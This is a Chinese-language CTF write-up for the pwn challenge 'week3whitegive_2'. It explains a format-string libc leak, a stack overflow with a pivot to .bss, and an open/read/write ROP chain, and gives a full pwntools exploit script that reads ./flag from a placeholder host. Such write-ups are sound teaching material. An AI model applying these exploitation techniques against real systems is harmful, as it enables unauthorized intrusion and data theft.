# week3whitegive_2

## 题目简述

程序同时存在格式化字符串和栈溢出。先用 `%15$p` 泄露 glibc 启动路径中的返回地址并计算 libc 基址，再把栈迁移到 `.bss`，利用题目中的寄存器装载 gadget 调用 libc 的 `open/read/write` 读取 `./flag`。原解来自 0xdeadc0de。

## 解题过程

`%15$p` 对应泄漏点距 libc 基址 `0x24083`。第一次溢出用伪 `rbp=0x404530` 和内部读入位置 `0x401341` 把更长的 ROP 数据送入 `.bss`。后续链先再读入文件名，再依次执行 `open('./flag', 0)`、`read(3, bss, 0x100)`、`write(1, bss, 0x100)`。

```python
from pwn import *

HOST = 'challenge-host'
PORT = 8006
p = remote(HOST, PORT)
print(p.recvline())
p.send(b"%15$p")
print(p.recvuntil(b" "))
libcBaseAddress = int(p.recvuntil(b"Now", True), 16) - 0x24083
openAddress = libcBaseAddress + 0x10DCE0
readAddress = libcBaseAddress + 0x10DFC0
writeAddress = libcBaseAddress + 0x10E060
gadgetAddress = libcBaseAddress + 0x15f8c5

payload = p64(0x404530) + p64(0x401341)
p.send(b'a' * 48 + payload)
payload = p64(0x404528) + p64(gadgetAddress) + p64(0x404530) + p64(0x400) + p64(0) + p64(0x40134A) + p64(0x404500) + p64(0x401368)
p.send(payload)
sleep(1)

payload = p64(0x4013d3) + p64(0x0) + p64(0x4013d1) + p64(0x404300) + p64(0) + p64(gadgetAddress) + p64(0) + p64(0x100) + p64(0) + p64(readAddress)
payload += p64(0x4013d3) + p64(0x404300) + p64(0x4013d1) + p64(0x0) + p64(0) + p64(gadgetAddress) + p64(0) + p64(0x0) + p64(0) + p64(openAddress)
payload += p64(0x4013d3) + p64(0x3) + p64(0x4013d1) + p64(0x404300) + p64(0) + p64(gadgetAddress) + p64(0) + p64(0x100) + p64(0) + p64(readAddress)
payload += p64(0x4013d3) + p64(0x1) + p64(0x4013d1) + p64(0x404300) + p64(0) + p64(gadgetAddress) + p64(0) + p64(0x100) + p64(0) + p64(writeAddress)
p.send(payload)
sleep(1)
p.send(b"./flag\x00")
sleep(1)
print(p.recv())
print(p.recv())
```

## 方法总结

本题把信息泄漏和控制流劫持分开：格式化字符串只负责穿透 ASLR，栈溢出与迁移负责获得足够长的执行链。采用 ORW 而非 `system` 可以直接读取目标文件。脚本中的 `0x24083`、libc 函数偏移和 gadget 地址都绑定于附件的 glibc 2.31；若更换 libc，应从符号表和反汇编重新计算，不能沿用旧常量。
